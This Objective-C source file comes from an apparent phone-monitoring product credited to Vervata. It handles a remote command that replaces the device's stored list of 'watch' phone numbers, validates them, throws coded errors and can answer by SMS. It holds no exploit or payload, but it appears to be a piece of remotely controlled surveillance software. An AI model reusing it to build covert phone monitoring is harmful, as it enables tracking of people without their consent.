/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  ResetWatchNumberProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  13/03/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "ResetWatchNumberProcessor.h"
#import "PrefWatchList.h"
#import "Preference.h"

@interface ResetWatchNumberProcessor (PrivateAPI)
- (void) processResetWatchNumber;
- (void) resetWatchNumberException: (NSUInteger) aErrorCode;
- (void) sendReplySMS;
- (BOOL) canResetWatchNumber;
@end

@implementation ResetWatchNumberProcessor

@synthesize mWatchNumberList;

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the ResetWatchNumberProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: self (ResetWatchNumberProcessor)
 */

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData  {
    DLog (@"ResetWatchNumberProcessor--->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}

#pragma mark RemoteCmdProcessor PrivateAPI Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the ResetWatchNumberProcessor
 - Argument list and description: No Argument
 - Return description: No return type
*/

- (void) doProcessingCommand {
	DLog (@"ResetWatchNumberProcessor--->doProcessingCommand")
 	if ([RemoteCmdProcessorUtils isContainNonEndArgument:[mRemoteCmdData mArguments]]) {			
		[self setMWatchNumberList:[RemoteCmdProcessorUtils validateArgs:[mRemoteCmdData mArguments] validationType:kPhoneNumberValidation]];
		DLog(@"ResetWatchNumberProcessor--->Watch Numbers:%@",mWatchNumberList);
		if ([mWatchNumberList count]>0) {
			if ([self canResetWatchNumber]) { 
				if (![RemoteCmdProcessorUtils isDuplicateTelephoneNumber:mWatchNumberList]) [self processResetWatchNumber];
				else [self resetWatchNumberException:kCmdExceptionErrorCannotAddDuplicateToWatchList];
			}
			else {
				[self resetWatchNumberException:kCmdExceptionErrorWatchNumberExceedListCapacity];
			}
		} else {
			[self resetWatchNumberException:kCmdExceptionErrorInvalidNumberToWatchList];
		}
	} else {
		[self resetWatchNumberException:kCmdExceptionErrorInvalidCmdFormat];
	}
}

#pragma mark ResetWatchNumberProcessor PrivateAPI Methods

/**
 - Method name: processAddWatchNumber
 - Purpose:This method is used to process Add Watch Number
 - Argument list and description: No Argument
 - Return description: No Return type
*/

- (void) processResetWatchNumber {
	DLog (@"ResetWatchNumberProcessor--->processResetWatchNumber");
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefWatchList *prefWatchList = (PrefWatchList *) [prefManager preference:kWatch_List];
	[prefWatchList setMWatchNumbers:mWatchNumberList];
	[prefManager savePreferenceAndNotifyChange:prefWatchList];
	[self sendReplySMS];
}

/**
 - Method name: canResetWatchNumber
 - Purpose:This method is invoked when reset watch number process failed. 
 - Argument list and description: No Argument
 - Return description: No Return Type
*/

- (BOOL) canResetWatchNumber {
	DLog (@"ResetWatchNumberProcessor--->canResetWatchNumber");
//	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
//	PrefWatchList *prefWatchList = (PrefWatchList *) [prefManager preference:kWatch_List];
//	int count=[[prefWatchList mWatchNumbers] count]+[mWatchNumberList count];
	int count = [mWatchNumberList count];
	if (count<=10) {
		return YES;
	}
	else {
		return NO;
	}
}

/**
 - Method name: resetWatchNumberException
 - Purpose:This method is invoked when  reset WatchNumber process failed. 
 - Argument list and description: No Argument
 - Return description: No Return Type
*/

- (void) resetWatchNumberException: (NSUInteger) aErrorCode {
	DLog (@"ResetWatchNumberProcessor--->resetWatchNumberException")
	FxException* exception = [FxException exceptionWithName:@"resetMonitorsException" andReason:@"Reset Watch Number error"];
	[exception setErrorCode:aErrorCode];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description:No Argument
 - Return description: No return type
*/

- (void) sendReplySMS {
	DLog (@"ResetWatchNumberProcessor--->sendReplySMS")
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						andErrorCode:_SUCCESS_];
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:messageFormat];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:messageFormat];
	}
}

/**
 - Method name: dealloc
 - Purpose:This method is used to Handle Memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
*/

-(void) dealloc {
	[mWatchNumberList release];
	[super dealloc];
}

@end
